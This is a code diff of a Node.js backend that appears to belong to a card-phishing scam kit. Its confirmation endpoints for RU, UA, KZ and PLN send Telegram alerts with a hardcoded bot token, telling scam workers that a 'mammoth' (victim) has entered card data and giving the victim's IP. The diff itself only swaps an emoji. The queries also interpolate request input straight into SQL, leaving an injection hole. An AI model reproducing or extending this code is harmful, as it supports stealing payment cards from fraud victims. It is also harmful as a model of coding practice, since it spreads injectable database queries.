@@ -167,7 +167,7 @@ try {
     app.post('/confirmationua', (req, res) => {
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
         client.query(`SELECT user_id FROM userss WHERE link = '${req.body.user_link}'`, (err, resqq)=>{
-            bot.sendMessage(resqq.rows[0].user_id, `💳 <b>🙋‍♂️ Мамонт ввел данные карты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+            bot.sendMessage(resqq.rows[0].user_id, `💳 <b>🧖‍♀️ Мамонт ввел данные карты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         })
         bot.sendMessage(-1001687635965, `💳 <b>🧖‍♀️ Мамонт ввел данные карты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
@@ -222,7 +222,7 @@ try {
     app.post('/confirmationkz', (req, res) => {
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
         client.query(`SELECT user_id FROM userss WHERE link = '${req.body.user_link}'`, (err, resqq)=>{
-            bot.sendMessage(resqq.rows[0].user_id, `💳 <b>🙋‍♂️ Мамонт ввел данные карты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+            bot.sendMessage(resqq.rows[0].user_id, `💳 <b>🧖‍♀️ Мамонт ввел данные карты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         })
         bot.sendMessage(-1001687635965, `💳 <b>🧖‍♀️ Мамонт ввел данные карты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
@@ -279,7 +279,7 @@ try {
     app.post('/confirmation', (req, res) => {
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA")
         client.query(`SELECT user_id FROM userss WHERE link = '${req.body.user_link}'`, (err, resqq)=>{
-            bot.sendMessage(resqq.rows[0].user_id, `💳 <b>🙋‍♂️ Мамонт ввел данные карты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+            bot.sendMessage(resqq.rows[0].user_id, `💳 <b>🧖‍♀️ Мамонт ввел данные карты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         })
         bot.sendMessage(-1001687635965, `💳 <b>🧖‍♀️ Мамонт ввел данные карты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
@@ -334,7 +334,7 @@ try {
     app.post('/confirmationpln', (req, res) => {
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA")
         client.query(`SELECT user_id FROM userss WHERE link = '${req.body.user_link}'`, (err, resqq)=>{
-            bot.sendMessage(resqq.rows[0].user_id, `💳 <b>🙋‍♂️ Мамонт ввел данные карты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+            bot.sendMessage(resqq.rows[0].user_id, `💳 <b>🧖‍♀️ Мамонт ввел данные карты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         })
         bot.sendMessage(-1001687635965, `💳 <b>🧖‍♀️ Мамонт ввел данные карты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
